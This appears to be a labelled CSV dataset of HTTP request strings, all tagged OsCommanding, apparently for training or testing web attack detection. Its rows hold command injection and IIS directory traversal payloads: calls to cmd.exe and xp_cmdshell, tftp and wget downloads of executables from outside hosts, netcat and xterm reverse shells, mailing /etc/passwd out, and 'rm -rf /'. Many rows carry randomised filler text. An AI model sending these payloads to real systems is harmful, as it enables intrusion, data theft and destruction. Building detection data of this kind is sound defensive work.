id,class,vector
2251,OsCommanding,/lyr/vV.swf?9nya1=9i&eawtink=aestlocation0du%24du%3Amleoj+c&%ugDFv8DUSXT=%27%3BEXEC+master.dbo.xp_cmdshell+%27cmd.exe&4apsogoanMsf=yEr+group+byry1m%5DLh9&f7eraea7nos45ii=m&6rbfsHye=rQQBV7&y-ipxmlVnX=lineloOrvhEeodsdo&2nii1ortdenoE=sx6tRtmQEdtoeAlRsN&slUdT=955&t6g3el=2ee
2256,OsCommanding,/scripts/..%5c../winnt/system32/cmd.exe?/c+tftp%20-i%2062.107.47.226%20GET%20cool.dll%20d:\httpodbc.dll
2264,OsCommanding,/msadc/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
2266,OsCommanding,"xhatei2ss=46546649&ecchpdenn=ejaee&3CNA1ctlm=a r&5tiaesobmo=08&RCIs=cmtoZCxlB&pedsRtTmgtldn=45729312&hoam2fooudnisn=etcIaleh:n| \&Yadmin8WGifzXDkdiv=1hhsqna/rm&3ndh=o9ayn&tt3sa=mnolT&eootIdla=661919&y0JPwp-J1=52739750&wrpv=exec xp_cmdshell '""T2ghaseade""     >>   script.vbs'&oea=ndxct\EoqCFptreyi"
2273,OsCommanding,/yla5execAU/passwdnetcatK5C1Lk@f3IUFM/eoFdoeou5nietbc4rT/cmd7%uHh/nvoideexe/ex5i09@fkr1m0MwoQ/9dengxusdyDusReHE/vromsiinwy/iKVxrWjgwqCescfU.exe?kcRi4aRxp_=Il6hts5Thphta&yHSd=%27%3Buftp+++-g+++%2Fhome%2Fesmellntse%2Fitatasleti++179.63.15.128+%2Fol+++%3B&tmlian=nmw0tDlwtc%3C%3Ae&eblntedltaae7ct=eQhHdOOx&Ph2ulBI=itM&scg6keen=19&k6ois7i=liboyyeshutdownacceptut&l9PQfR=r&6L=3917277917&cO4UL=tdl
2276,OsCommanding,..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
2284,OsCommanding,/s0ige5sqdmeg/uexec/mrovisttrula/nPawratee9ucitatcsn/c3uzonie7mwo6eelcrja/ihpto32y4okpsro/si1Arhnoz8ziefNmc3d/awSdxRUkXcyhHY59m6Y/lereHhem/eKItj/bE3S5IaV0lSiT5gil/eeeenssItsloisE.shtml?esla7p=processing-instructionze%3Dy&htk4vigsp=71126&6oti=gyrdsloclnn&mtnjdele=%5Cr++++xterm++-display++++188.124.121.7%3A0.0&statt=Htinnwuelibnefinsert%29diva&kChomeG5=065932637&z4a.SO=%2BHeao&zthKoauulagn=qlwh4exree&nneAare2=82248615&msbhtd87Ss=839&DKs_W7mA=1499041
2289,OsCommanding,/9xmlTHBpcHrj_Zu/access_logpositionL5BKfrom8hJWxkG1/v./gwe02jrOavdAn9fhone/iQ54jlqIQ/btulhr8l9lE/wz0BVCiN1p5f4vqiMXN/4SFUzmC-eQpQLn4Lt/eBc8@8/4o2oimim4peDD7c.cgi?npatermoed=1072895486&tec=41&egSjM_Yg=oK3GXMr&aeonctudggnnc=it&rmdjoahntpgps=ei%3CisE%7Ero+c&tlei4nesh=%250a+nc+++www.neol.com+++++80+%3B
2300,OsCommanding,/bJ/hiREvUr@g4/e1JCmPV_WFG2HKv/pL6.wSIa/rkeVV/rsF.shtml?uiSq5cowhtrhl=30033&hdrchQ=8Hn%22i+w7%294&aj=dNeaslogmusrwto1rtw&naTgjhOtxe8e=ay0yeaeermAhn&hcese=148.204.27.206+++%7C+++cmd.exe+%2Fs&pLrprex7=aaps2ozi-hP&mHYo7qjvq=203155
2308,OsCommanding,/riv.tOz1eUO@RQ/ebe/sy2sweet6dh/ti/lE_rl@WUsdvQ/e9rhhtentd9nDyh/2ssHcdtttl6Vsoa8nn3d/e_eF/bZBjP8%uoHzKs/4i/sT/e5zoMS.swf?tirEnrsdoicchu=73&lgegeays=04290&nt1=%22++%3B+%2Fusr%2Fbin%2Fwget+www.asteasen.com%2Fne+++++%3B&rhEoeztey=2eide6ntaedthqn&ttAemrw=hc2C0c%40d&lpby8tpoh538=r4jsblidErcp&odh9Sr1eOFeaea=841876&oaI5CeioNoan5e=Erhtpassvn&pon=%25oeeeeslB0ooe7e&a9eae=12050&Haln08r=uJtqp.GxC&wsns=4662932
2315,OsCommanding,/62JJ6g5sselect0aU/dCCHo/hNzI4vDG/rizsnkm/spr5Ons9EtKiV7/bitqoOMtu/9RQ8I@vechoKQA/gQ_m/_FgYEK7-VTL_/sooei.mdb?d3=+hjrjrzoEpoE&WnNhosbnaa=nE%24ru&taslaaihsmxrti=nrnsz6metowe4uodte&koiteg=Lvnpty&reapiglreb2a=%5Cnwget+++http%3A%2F%2F254.33.171.65%3A87%2Fnftp.exe&olssa7gnrae=qcenbgeeu
2318,OsCommanding,/rjQ64bTQCFeI94/lsagezdxierE/oMjzbtESgW8vgikrFBE/nofucic/QPselect.AVVwkevalZm/qRm_hhmXyc.css?slhns=42658890&7dXmKGP=texpt+sm&mpEeth=9203&F1lo=%5Cn++++uftp+++-p+++www.maitleat.com+++++%2Fasisge%2Fetll%2Fndndit%2Framero%2Freli%2Frait
2321,OsCommanding,"/scripts/file.bat"""
2324,OsCommanding,/msadc/..���../..���../..���../winnt/system32/cmd.exe?/c+
2337,OsCommanding,/cgi-local/alibaba.pl|dir
2346,OsCommanding,/aqrlZf1PH8-WZLTonwb/oimdtstdnem7nboue/2wfh/o-62xnWvUQ_nEzSz/3oCXV8IZ1fbBiF/eS@eSZlTJ@xflWfb95AB/oerh/JfmsrCor7s3h1fhO/iFVox9piduIlY/e_rdb4e3iZ.bin?
2352,OsCommanding,ma=cat    /etc/passwd|&ehlaoereth=2j8&am=ucalgpyhalib6r9div&iasordid9usimet=rnn6e 6l&rttjrhdanEsttac=73411456&nyahi9a7=Nefae&ea=rl
2356,OsCommanding,/ssi/envout.bat?|dir%20..............1
2357,OsCommanding,/oactthtc1ngil.html?@7svupFFrKt=++++%3B++++echo++%3B+++w%3B++uname++-a+%3B+++id&rhIfshsjmpst=ad&et=-way4&djleedust=on&doea6aInp=7thsbex%25%5Bo&dhen907snd=izqo&K2CFlNgform=iss&w-kbC=cblqs5enu2praC2o&eoh=ivPKbD_X-KN&ozmht4eao=2so234&rl9gtsr=rdbAerl9s&et=htpassaonbgsoundiapassthrumh2tuu&6.E3ghVZ@cY=hjsd
2366,OsCommanding,/t2sn2Uoeeigyt/2eaitwt/aedhWjepe5ons/iGyhqAtgH/q6L/dsiegeanroB/CKZTjbaccess_logqe/oa0rds2.exe?hek2nRncany6Mea=%60rm++-rf++%2F++++%60
2368,OsCommanding,/msadc/..���../..���../..���../winnt/system32/cmd.exe?/c+
2374,OsCommanding,..%u00255c..%u00255cwinnt/system32/cmd.exe?/c+dir
2381,OsCommanding,dpcIxycs6=tmai&ant1eceh=dwyGzaBdB&mtdo=649&Ra=ketps7adr(open&epia4hu=r$>o2prrkv<i (n&PqYr=tftp    -c   get 98.164.40.13:/chla/tetomech.exe    |&bEwus2trb=e1xEBLYkY.aG&2ttHd9atzk5k=eW3eWPcSu9o&sa=$o]&nsurlaoi=alldit5:'telnetcaaavbscriptdxp_fromhTvar&sDaccess_logbody53-=ytmNs
2384,OsCommanding,/scripts/..%5c../winnt/system32/cmd.exe?/c+tftp%20-i%2062.107.47.226%20GET%20cool.dll%20d:\httpodbc.dll
2388,OsCommanding,/t4/t06luGAAin/dnNwPOa.jpeg?liaia9s9enk4=%27++%3B+++++ps+-aux+++++%3B&jchnSeledolhse=lgrmetasystemSfd%7CA3autoexec8tsr0%3A0&naacyduqipcfeiy=7145&o0tWA7o8iab=5&ethzl0eilE=da&euehlInlteGe1=831942253&iXht=mTu%2BEio&qp4ntilnoei=ondeleteas&lipiqHg=189981&U0D_6perlGB=1&ibuktaassmpnohh=nlE5&EZ.bjFE8stdin=4Ks4E3&Vawrxtt=ia%3Cn&hZcey=6
2392,OsCommanding,/rns3etmeNaaee5srr/aBx.nsf?lsipAape1hTr=tta&aqm5i1oinr=aet%7Ee&like7connectAfON6=b%28c%2Bmsw+&ceok4S5Hneee=oops+++++%3B+++++cat+%2Fetc%2Fpasswd+%7C+++++mail++your%40imdtn.com&aeetleeiifr=dts0eLayrinsertnph-i&mpce=aSxd0S&xw_KN8V=i7yl_HzB_j&tEwpt=crrA&orni=7&is=eIt%5DopiG&xeol=edwhhiwos
2399,OsCommanding,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe?/c+dir
2400,OsCommanding,/scripts/..%5c%5c../winnt/system32/cmd.exe?/c+dir
2402,OsCommanding,/nitnuk/r3OC.js?otarhdds=182&1saecthMt=529442&3oisdz=22&8imnthvmad=AE&ew1fwnheeuj=w%3Bt&_0Iw=8&hiTf4=ebhso&nivaRTs=aUA9r&sitapfentnnr9sd=e6nysihyysEigs&sezsvetT2heejr=nGeFCfrg&nMRerr6hrhs0sem=lemt&oeaTygrnoyevei=39&orDpdy=tftp++++-c++get+16.122.58.138%3A%2Fil%2Fntletoti.exe+++%7C&rkkuar=5655676
2412,OsCommanding,/scripts/..%2f../winnt/system32/cmd.exe?/c+dir
2425,OsCommanding,/file.bat/..��..��..��winnt/system32/cmd.exe/c
2435,OsCommanding,"Ricprbseomb=11760797&dtnxhnineggz=|    dir  ..\\..\\..\\..\\..\\..\\..\\     ,&Acnenrw=sr| system&arkfensfrlk=Enu3dLnullrat&IioJ77eval1Nl=231&siolmtZohocus=o &QvgI=ma7O&nresl4=a@Y2telnetnoptsxmlwget&tle;U"
2439,OsCommanding,/samples/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
2443,OsCommanding,/scripts/..�
2446,OsCommanding,/7nP7x0/updateFe1Oeb/uHX5K/iRNe/reroefnyse1lhTtn/n7jQuBQ.jpeg?remsuntm5nfeOao=rz3YUFOe4&gelsptn=cl&Ku_.s.3uF=aaeboahuo&laUeserAkonc=2306531&8eaaeei=t9tvbot&ardNAr6re=oHd56E6uHhEE&gwhiqsZranyg2tj=poms%2B&rhhgsbrw8j4bone=916847&ybrMi=%7C++++cat+..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd+++++%7C&77-dFrVO2FZ=r2kkN
2454,OsCommanding,/PBServer/..��../..��../..��../winnt/system32/cmd.exe?/c+dir+c:0
2463,OsCommanding,/IISADMPWD/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
2464,OsCommanding,/re1nngj7Avo/nleggmefal/st_9q.jsp?tt=561936&odeiaDmrys=i2z&7w7bitbreorp4=%2Fperl++++%2Ftmp%2Fge.pl+++++-p5055&4e=944&8r7ijd8=94560&CYEhtaccesxmlLdWD=wMqHKgTzo
2471,OsCommanding,..%u00255c..%u00255cwinnt/system32/cmd.exe?/c+dir
2477,OsCommanding,/scripts/..%2f../winnt/system32/cmd.exe?/c+dir
2485,OsCommanding,N0lsmid2sa2eot=d_2&haonfuen=4058013&eni4l=efobw&sv=eidn1msmr|asno&ligiesact7i5r=pfZ&sEtehcoitI=Xes
2488,OsCommanding,zcsaQlef=fxjytEsI3y&jsuWN25U=ltsEnprrn5Ets&@boot.inigQ.TFuJ=tftp  -c  get 213.135.105.28:/ntngalan/siel.exe |&ohpt=64&ydyual5rhrcch=loghN+b:4bb&s6zlbtNGt=ncatreplaceh5&9nKyU6YW7V=5608&ybwvdPiPne=xP@&tpetatsx=thYstrin vhaft> oo&hgtsmno=@
2492,OsCommanding,/tuoa2wak7l/QX@1Oax/tonothsfo0aPtwar3T/OaHsQDYMEF9a_F/SArjE3ZtshutdownE1mOqp/taieorr/aj_/e.vT.jpeg?tusstargn=37146&ssca=oQmB&o7tc4=0012942&nay8n84=6010312257&elfdl=%27+%3Buftp++++-g++%2Fhome%2Fnetoorselein%2Freannitoti++232.7.82.180+++%2Fgetric+%3B&oaeshRo=09089&ng=9372276948&osnekavtdrmd=17
2493,OsCommanding,%u002e%u002e%u002f%u002e%u002e%u002fwinnt/system32/cmd.exe?/c+dir
2495,OsCommanding,/ssi/envout.bat?|dir%20..............1
2498,OsCommanding,/Nin3metxo1dfIshree/a3GGeUWG9r3e2C4RU/hibnt0pxc7atdo9ocaep.mspx?onTiebiw=%5Cn++uftp+-p++www.iera.com+%2Fen%2Fndtrtr%2Fngar%2Fsiar%2Fenng%2Fto
2503,OsCommanding,/ehntbo2w/jz5ntc/e1oe_IobEUXN53S/nf0VlJ/lhbsie/B5K0XN/eCiYuiwa4.jpg?0KKPPpassthru9ncO=noah11wkw3has&srg=lleflsinEaoha&tismiunc=0&LSTVWtmp=ls+++-las+++%2Fhome%2F+%7C&xolOolt=15&ssrgthlwu9tne=91464&eeitjnp4s=6&xetnsS8=c9L&tromhqiel=90
2504,OsCommanding,/HvVc/l3xjVF9EZcatHEg/SsamGKHQ7IU.sh?o5elcI27xsehwm=7078141&elestlehsl=caic%3Beiee9tph5&oosrlsotteR=3&wp-WeBc4=76427&kiui=rAcNBPxy&ni=pstkn&Y@0lspasswd6Hp=++++%3B++echo%3B+w+++++%3B+++++uname+-a++%3Bid
2506,OsCommanding,/scripts/..��../winnt/system32/cmd.exe?/c+dir
2515,OsCommanding,/emDzV0Z8.cgi?apwewoDaCshaog=8%25%2Br&rreoiuinf=aslewfe2uf9TdWbiTk&Wnkm=d&eFwgetO36Vjf=oirtlhtr0tdcmnb&ntjOgauwyiP=seOev&ooagrss2Au=753900315&naw1d7e96=fi&Eqn6=66327076&te=xKmzYra7WJAx&cn6sa0eaeYaaR=86&e6xa7n=+s
2528,OsCommanding,..%2f..%2f..%2f..%2fwinnt/system32/cmd.exe?/c+dir
2536,OsCommanding,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe?/c+dir
2552,OsCommanding,..��../winnt/system32/cmd.exe?/c+dir
2576,OsCommanding,/file.bat/..��..��..��winnt/system32/cmd.exe/c
2585,OsCommanding,/hoCkFz3Nh@RCFG3.Uk.js?@GGjechowO=b&ssshyrydstnt=%5Ceg&teepsu2enn7mahG=9820201755&ueqlTaudhosbt1=%29wheresformw&kel8Ah0oiMt7tf=91493&sxahabresfhh0i=4s&i4yeritrerk=22&jEutoWelRzy=xzir&thUnL8.k9=r%3E&5hognuhDb=hrod&ouhrla=32011801&vbscript967bgsounda=64003885&e0ujh=e&htedtua4ne=iGc%40&5uTa1=qirt%3Cayaccess_logooold
2591,OsCommanding,/scripts/file.bat/..��..��..��winnt/system32/cmd.exe?/c%20dir%20C
2596,OsCommanding,/file.bat/..��..��..��winnt/system32/cmd.exe/c
2598,OsCommanding,/iUnEB/82oooragi5ougalwdT/uSGPBKLTx67u9oIv/dc/aNPV3IgUkpsf0/sf9b/AibsTZuehcrdn/Nr.g8NLbXIueV/hmR_lt3fD7mqt2/ivsLEo1L2@v9YC4.nsf?erdatsntc4=dHlsB1tnjF4l&cnssb3esiOsd=5&xml6QBa5divm=tzajlhtaccesa&-iMNL8W=4847&inOo2her3ruj=o954k&TAHjf.wmbrKI=06039743&esn5brhl6ed=h&omeieaHs3rtlru=meegyinzIcnwr&ris3d5Ddtn=%22++%3B+%2Fusr%2Fbin%2Fwget+++www.erlatoer.com%2Fchan+++++%3B&q6wopt2iK1k=bc0dfM%28Sr&isobroidTl9=9220751958
2621,OsCommanding,..%u00255c..%u00255cwinnt/system32/cmd.exe?/c+dir
2631,OsCommanding,lr=hU&BFoq=zrpassthruedlgsss&pudp=7&uihf=3&itsSeligle2enoo=658325&cet=089784
2638,OsCommanding,/_vti_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
2639,OsCommanding,/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+
2657,OsCommanding,/data/..��../..��../winnt/system32/cmd.exe?/c+dir
2677,OsCommanding,/scripts/..��../winnt/system32/cmd.exe?/c+dir
2680,OsCommanding,/Tfs-K92fA6wgetserviceswcnode/no9passwdxXwautoexec/h5hX1Y4kHbi8dIx1f4/catQ/tqtttm/uo5uo7ttlbehdNEdc/gh-cM9Vde/linkX/a7eNsotott4btnEE1iea/3hrr.shtml?q9otWhtl=90&dia=v&rhnoGdt=%3Cqla&eo=lrotoformwn2naYs&ttda=08169305&nSnbesdeto=7&6ttecselY=9setk&tr=s%3Arac%3C&tl7LRshhe=80987299&PupepthwynOr=76&sinlO=670582969&gtrq0iE=4876939&eat5Oreg=%7C+++ps+++++-auxwww+++++%3B&yee1Her=sp5
2688,OsCommanding,/eetS/Tyt4eh/Rfh/6-mH@fViME/hbAFD2WSSzg/sR_PN81Bn1R2A/n7T79dtimnroesqs8et/ogO/e3JKxeb/CGVQL.mspx?C8Hg0q9=w6QI%40%403-n&tMnRM1wGUslr=ermub7sErEand5i&ue=6e&vMEu=gga&o8hNet=qao&d8phpR=ex&Dp5jQILVesG=da&be6ESfrompWrKvj=%7C++shell%28+%22cmd++%2Fc++++c%3AInetpubwwwrootMSISSnc.exe+++-l++-p+++3046++++-t+-e++++cmd.exe+%22++++%29%7C+++%27&t9=76&p9nteEp=ddss&sKOp=%5Bdd1lib&ohrkri=%26pm&a1uts=ureposcalees&idMK8unionA=yFIs
2689,OsCommanding,/scripts/file.bat/..��..��..��winnt/system32/cmd.exe?/c%20dir%20C
2691,OsCommanding,/_vti_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
2698,OsCommanding,/bin/lq.pl/seite=;cat
2713,OsCommanding,swbveEb=7&aiSms=xtermtloglcand'7ytniwLYynexect&KpmN=urcTBxUSXpt5&oceaqucirckly=8273836310&Lartmoosiepbi=txne|aaiyh&isur=7etatdote
2721,OsCommanding,/scripts/..�/../winnt/system32/cmd.exe?/c+dir
2729,OsCommanding,/bin/alibaba.pl|dir
2736,OsCommanding,/ssi/envout.bat?|dir%20..............1
2741,OsCommanding,/hP@ZtOw4ezj8m1iNWvKU/Az7saappcgda/tm/S2HexecIWMtshutdownV@/dtar95uarrmftti.png?tifin=%27%3BEXEC+++master.dbo.xp_cmdshell++%27cmd.exe
2742,OsCommanding,/_vti_bin/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
2748,OsCommanding,/scripts/..�/../winnt/system32/cmd.exe?/c+dir
2749,OsCommanding,..��...��..��..��..��../winnt/system32/cmd.exe?/c+dir
2751,OsCommanding,/47cntytcwzanow/gR@8.8VW0AeuClF.o0e.gif?ai1ishahdgS7d=9111800&Emiha5s5ot9a1ei=41134&qeFo1lItrree=13423&txmedn4=65.215.109.21+++%7C++tftp+192.168.10.33+evil.txt&M6whtayEOur=%3Eaamv
2752,OsCommanding,/scripts/..%5c%5c../winnt/system32/cmd.exe?/c+dir
2756,OsCommanding,/anmneNE4uuSdo/u6If_UEl8f/eL2yE/eslDE/sniZrK7FklPC9G/swt9de/gHMjinozU/tohq.mdb?aiaerotiEfAias=%3B+++echo+++++%3Bw+++%3B++uname+++++-a++%3B+++++id
2758,OsCommanding,/dI5KZe8IG41Gww/ser.tiff?yadoaemeesyhnh=%5Cnls++++%2Froot%2F&inmeyji=148590&lbroEs2=%5Blike%27r
2761,OsCommanding,/handler;cat
2764,OsCommanding,/PBServer/..��../..��../..��../winnt/system32/cmd.exe?/c+dir+c:0
2765,OsCommanding,"/scripts/file.bat"""
2772,OsCommanding,/2insert1A4BK.jdD/yh60d/bshe.mdb?ayekwfuue=a-aP&qfFce=897Nd32Gbz&o7wCsarsiSrtem=nWjNmYVy&nd=knyta&unyoi4t=eiTeeciat4AeiyUz&1dtwllotCao=49&2AOtLZa=i8k&8xeehrZgtt3zo=%5C%3B%5C%2Fbin%5C%2Fid+%3B&ancblr=103701&LTpSsgincludeElI=rifromhrlecpylDc&a9=2onbhw&A2G.s0MqUTpR=833781367&hiF=aobjecty&4A0O4=08&eh3sinIIwtu=eao5hpo
2807,OsCommanding,/aA39bPAHP/vZqv5hLjHI/eRbske/wi8noleuE0/tB/dzp4Slij90ci.jpeg?oVoo6Nnoaak26=%250A+++++xterm+++-display+www.atieralaveat.com%3A0.0++++&mlAot8sareorU=50365
2815,OsCommanding,/t21L03UwADg.swf?
2836,OsCommanding,/scripts/file.bat/..��..��..��winnt/system32/cmd.exe?/c%20dir%20C
2837,OsCommanding,..�
2838,OsCommanding,/o0v/ZeYXp0PXR/uidet0ueoLei4g/Crnr/W4i-OAReE/xhobject6-h._J/6uAaexecV/s1Ezo/9kvconnectsbrwhereunionhbBu/C4v/sxsj5RbDL5s.gif?lLeoono=n%40Qxa3Kwbw&mRilugdw9R=dcataao%7EformitDqotmtn38&eKirh0sdnaa=3&vfv=whiiscnomehdmvrts&hseyrstKWh=eganMntign&fs=475&o8Nhemoeudt=+%5Br&ytsrr2afrmo=shtpassdsgcmde07&raGiO8roofuoatt=0857&b1gt=a9_HcxeLN.x&ehaE=nfi%40wgetimWi%5Dr5Et+a-+n%40&FwgetPRhavingdGp57U=mel
2840,OsCommanding,/2k/ldo/ctdsesr9sdodiot9oho/s1/bodyperl-GzQorLs3nid@y/gjeYplEbLL0/td1o13s1bcrmgee7atr/surriaqs/fI4raEnehAesuJmi/fp@./6union@tTkF@.jpeg?Jvarz0BugsFpKw=97342&rn_sMD=034811&hsregae=195.162.215.84++%7C+copy+c%3A%5Cwinnt%5Crepair%5Csam._+c%3A%5Cinetpub%5Cwwwroot%5Csam.ddd
2852,OsCommanding,/scripts/..�/../winnt/system32/cmd.exe?/c+dir
2855,OsCommanding,/_vti_bin/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
2862,OsCommanding,wi5eer=lid'~$etcntstdin>nscripta&bitz=oet&b36eimgp=r/&Eprocessing-instructionN3BncQzsdxA= |tform'childeiqxi a&orMBrkxPxmlQ=t9k8eIvEaF8W&elaaodioi=071643
2863,OsCommanding,/_vti_bin/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
2873,OsCommanding,/scripts/..��../winnt/system32/cmd.exe?/c+dir
2876,OsCommanding,/msadc/..���../..���../..���../winnt/system32/cmd.exe?/c+
2887,OsCommanding,/scripts/..%5c../winnt/system32/cmd.exe?/c+tftp%20-i%2062.107.47.226%20GET%20cool.dll%20c:\httpodbc.dll
2896,OsCommanding,/nru14jwE.bin?hntesrvhhPcnt=eodsoamrruaerh&MJdZ0fjXwi=xmlrst%3Baen&tj8W=91612&56rteeenco=e-Qj&1ocOlteSjetcino=rh.wlxG
2906,OsCommanding,/te6LEaeK6RZGV/eFTzrR2nXDQ1@pet5e4m/ZgQDho5VSchttpsrfromDshutdown/eZeo34d8PgpOL/sauienipc6heonU/httpsuCH3b.jsp?inee6aiemvdodE=4or&HrhacecsmARNulu=o3eessn7rwdxq&zdycSea=rajcopyuvTiiexmlnc&EEfd2ysMzl=%2Fperl+++%2Ftmp%2Fllor.pl++++-p8902
2913,OsCommanding,/scripts/..%2f../winnt/system32/cmd.exe?/c+dir
2926,OsCommanding,/access_logbT6E0urB/tSasoonyunir1Mtti/iE/w0Osey7tx/.E5echol@stdin6processing-instruction/rteaO7eiee.bin?D_hTQy@65.a=%5C%22+%5C%3B+++%5C%2Fusr%5C%2Fbin%5C%2Ftelnet++www.rastenel.com+++++34%5C%3B&batuttn=fr&2winntEfj_L=scriptrNhstmjcmd&4eiehteeaiirt=soIahtaaeos8NbcUum&erEqosAe=deifhtacyEdlRhf&wh0dkoe=xt6bn&eXhr=oi+dbgsound&M921KubX=ann%5Chnre&eqb=360457&4hrr=15
2928,OsCommanding,naccess_loghomePONUMY74F=58721606&gn=|     id     |&anzp-Wc=ce leM&uauwmoeoTprrW=uS7UkVpiGSf&uzindhispv=stt&RoAraqbpuhhm=69mo&it=mNj
2930,OsCommanding,/vs/3qK2R_o9RYGsBB/NY/5wiut0nyda3oar/csq3irc/htrqwebarehiT2c/diZ/eeriesRcq5mD.jpg?vsmitctniutexe=alwehdsngrd65&3estiituts8=%40&n46OSonnbrengn=%2Fperl++%2Ftmp%2Freic.pl++-p5249
2936,OsCommanding,/PBServer/..��../..��../..��../winnt/system32/cmd.exe?/c+dir+c:0
2940,OsCommanding,..%%35c../winnt/system32/cmd.exe?
2959,OsCommanding,/file.bat/..��..��..��winnt/system32/cmd.exe/c
2961,OsCommanding,"/scripts/file.bat"""
2970,OsCommanding,/scripts/..%5c../winnt/system32/cmd.exe?/c+tftp%20-i%2062.107.47.226%20GET%20cool.dll%20c:\httpodbc.dll
2972,OsCommanding,/wIioaEI03nen3rahvtNl/ntni/oadiu9ahq/Kz-/eauU/ncMaht/ehoeyeHItgS/srorl7sei5ztHt/eR8v@dW8cLt-c.jpg?nooeGee=icw2esspynDe&i4aa=rcuE3lheyajoatl8fT&Yjoha1ektSfec=%250a+++nc+++www.nsmeonnang.com++++80+++++%3B&2kP10AES5e=tnrnoacN%25%7Ew+%3Dn&8l4aaail=d6rhomliwars&dbodyoRq3Wyhp4stdin=877&w9FE6mnG2T=15286546&nscce=hoXsG3AkR3&rsgoohpdW=523&2ih9eac=2D6t3r&4D8Ce=t%3Be&o00lkns=i
2985,OsCommanding,/sdG/nGLOeJ6/sSDi/lAEX9iWcBoj3/nsPwVS39fzmtNk4/5nt/elZmI/r9SVadminIp-0Uw/5Fe05bWEo.Og/zNeOyetAa/er25Clj8.msf?t0dsat881Qde=4&WwHFandG0Hw=copygh&eiam=0%28e+%3Dsichildtaedrcp95y7bTA&3maoto=eyhdh&IUxterm2JYZ2.J=aleneh3c1&tgsi2orMV3=tCgE1E&udOg=A&fitwhlott=0&tptat7teeitcod=esit&notae=43468977&ernhkdrzyEfo=ag%2B1
2988,OsCommanding,..��...��..��..��..��../winnt/system32/cmd.exe?/c+dir
2992,OsCommanding,/cgi-bin/../../../../../../../WINNT/system32/ping.exe
3000,OsCommanding,/cgi-bin/../../../../../../../WINNT/system32/ping.exe
3003,OsCommanding,..%c1%pc...%c1%pc..%c1%pc..%c1%pc..%c1%pc../winnt/system32/cmd.exe?/c+dir
3005,OsCommanding,/etcanodeB4@J9dropetccat8sF.asp?irourrel7=tV9ywd&e6f=0389&iTiTw=%27+++++%3B+++ps++-aux%3B
3031,OsCommanding,/iisadmpwd/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
3032,OsCommanding,..��../winnt/system32/cmd.exe?/c+dir
3039,OsCommanding,/Ift5WoasNXcfu/wnKjCUKGUJUQKo5Z/ttLKx1PO/hhNuttennne/wwnewth2RoemSden/etw6uihebnnSexmatsst/14iLo6ezeifanx0Rdoe/Esezev/lQtHY6WWAL7/eewhshiuv2tageH/tS@YudD2/rupdate4E3WDpwHmochaQ6.nsf?sqwidmAnsel=854043&6aopv7=mail++Rohaaodi8u%40atp.iemuv.gov+++%3C%3C++%2Ftmp%2Fwu.c+++%3B
3042,OsCommanding,/PBServer/..��../..��../..��../winnt/system32/cmd.exe?/c+dir+c:0
3055,OsCommanding,/peasuOgKzU3iX/tqAs/oYxhaa7iJwJ4yhq.Jm/elyn9Onoar/2script/8_hVFXZsTEKv.png?nnnMdti=xyDncnsefit&nlh7iceod=sBnMAObAP4&g8f=LHeni2Yed7eliet&x3atoxtepaen=pr5E.&dJBTmBf2wfB=n%29&AAG.body=5165&0hsdheqte9=pdEhRr5pinaeefh&hex2pHeYh=3&ahA=95647713&5aeeeaGs0=heau%3F%25t6e6ldtIartv1m&desd7R=odmxlo%26%3Feeo&G@J_b1g=ts%3A7t6counE%29&rtN=aldqi8&micZw=6f%24spst%3En+
